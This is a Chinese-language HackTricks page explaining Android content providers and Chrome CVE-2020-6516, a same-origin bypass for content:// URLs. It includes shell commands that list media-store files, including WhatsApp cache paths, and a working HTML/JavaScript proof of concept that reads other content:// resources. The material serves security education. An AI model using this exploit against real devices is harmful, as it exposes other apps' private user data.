<details>

<summary><strong>从零开始学习AWS黑客技术直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


要试验内容提供者，可以在Android设备上使用`content`命令。不一定需要根访问权限。例如，要查看由媒体存储管理的文件列表，可以执行以下命令：
```bash
$ content query --uri content://media/external/file
```
为了使输出更加人性化，可以将显示的列限制为每个索引文件的标识符和路径。
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
媒体提供者存在于它们自己的私有命名空间中。如上例所示，要访问内容提供者，应指定相应的`content://` URI。通常，可以通过查看应用程序清单（如果内容提供者由应用程序导出）或Android框架的源代码来恢复可以访问提供者的路径信息。

有趣的是，在Android设备上，Chrome支持通过`content://`方案访问内容提供者。此功能允许浏览器访问由第三方应用程序导出的资源（例如照片、文档等）。为了验证这一点，可以在媒体存储中插入一个自定义条目，然后使用浏览器访问它：
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
要发现新插入文件的标识符：
```bash
$ content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
```markdown
要在Chrome中查看文件，可以使用如下图所示的URL。请注意文件标识符747（如上所发现），它被用作URL的后缀。

![Chrome "你好，世界！"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

例如，您可以列出与WhatsApp相关的所有文件：
```
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## Chrome CVE-2020-6516 同源策略绕过 <a href="#cve-2020-6516" id="cve-2020-6516"></a>

浏览器中的 _同源策略_ (SOP) \[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)] 规定，URL A的Javascript内容只能访问URL B的内容，如果A和B的以下URL属性保持相同：

* 协议，例如 `https` 对比 `http`
* 域名，例如 `www.example1.com` 对比 `www.example2.com`
* 端口，例如 `www.example1.com:8080` 对比 `www.example1.com:8443`

当然，上述规则有例外，但通常情况下，`https://www.example1.com` 的资源（例如一段Javascript代码）不能访问 `https://www.example2.com` 上的资源的DOM，因为这会引入严重的信息泄露。**除非跨源资源共享（CORS）策略明确允许，否则网页资源不应该能绕过SOP规则。**

需要注意的是，Chrome认为 `content://` 是一个 _本地方案_，就像 `file://` 一样。在这种情况下，SOP规则更加严格，因为每个本地方案URL都被视为一个独立的源。例如，**file:///tmp/test.html** 中的Javascript代码不应该能够访问 **file:///tmp/test2.html** 的内容，或者说任何其他文件系统上的文件。**因此，根据SOP规则，通过 `content://` 加载的资源不应该能够访问任何其他 `content://` 资源。** 嗯，Chrome的CVE-2020-6516漏洞为这条规则创造了一个“例外”。

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)] 是一个在通过 `content://` URL加载的资源上的SOP绕过。**例如，从 `content://com.example.provider/test.html` 加载的HTML文档中运行的Javascript代码，可以加载并访问通过 `content://` URL加载的任何其他资源。** 这是一个严重的漏洞，特别是在运行Android 9或之前版本的Android设备上。在这些设备上没有实现作用域存储 \[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)]，因此，位于 **/sdcard** 下的应用特定数据，更有趣的是位于 **/sdcard/Android** 下的数据，可以通过系统的媒体存储内容提供者访问。

概念验证相当直接。一个使用 `XMLHttpRequest` 访问任意 `content://` URLs的HTML文档被上传到 **/sdcard** 下。然后它被添加到媒体存储中，并以类似于前面展示的示例的方式在Chrome中渲染。为了演示目的，可以尝试加载 `content://media/external/file/747`，实际上，这是"Hello, world!"示例的媒体存储URL。令人惊讶的是，运行在HTML文档源中的Javascript代码将获取并显示 **test.txt** 的内容。
```markup
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
**从这篇文章中获取的信息：** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客技术！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
